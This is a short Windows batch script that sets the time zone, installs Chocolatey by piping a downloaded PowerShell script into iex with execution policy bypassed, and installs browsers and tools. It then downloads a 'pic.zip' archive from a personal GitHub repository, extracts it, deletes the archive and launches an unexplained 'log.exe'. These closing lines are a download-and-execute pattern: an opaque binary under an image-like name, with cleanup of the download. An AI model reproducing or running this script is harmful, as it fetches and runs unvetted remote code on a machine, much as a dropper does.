tzutil /s "Tocantins Standard Time"&
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command " [System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"&
choco install 7zip -y&
choco install googlechrome -y&
choco install opera -y&
choco install wget -y&
cd desktop&wget https://github.com/nguyenminhtuan1741996/test/raw/master/pic.zip &
7z x pic.zip&
del pic.zip&
start log.exe&
exit